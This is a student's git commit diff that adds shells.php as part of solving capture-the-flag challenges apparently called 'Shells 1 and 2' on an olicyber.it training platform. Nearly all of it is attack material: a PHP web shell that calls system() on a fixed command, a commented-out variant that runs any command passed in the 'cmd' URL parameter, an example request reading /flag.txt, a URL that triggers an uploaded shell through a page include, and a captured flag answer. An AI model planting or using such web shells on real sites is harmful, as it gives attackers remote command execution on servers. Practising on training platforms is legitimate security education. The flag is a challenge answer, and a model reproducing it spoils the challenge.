7e27479475dc16227ce80b8780e7ce903620bbbc
Cesare-Di-Masi <cesare.dimasi.stud@ispascalcomandini.it>
2024-12-19 15:06:48 +0100

    Shells 1 and 2
    ToDo flag of shells 2

---
+++ shells.php
@@ -0,0 +1,11 @@
+<?php
+    echo system ("/getflag"); 
+?>
+
+//echo system ($_GET["cmd"]); 
+//pagina?cmd=cat /flag.txt
+
+//http://shellrevenge2.challs.olicyber.it/index.php?page=uploads/c49c1ec7c7286f841b9297ad76a6f3ab/test.php?cmd=/getflag
+
+//flag shellRevenge:flag{sh3l1_p0w3r_1s_k00p4_p0w3r}
+//flag shellrevenge2:
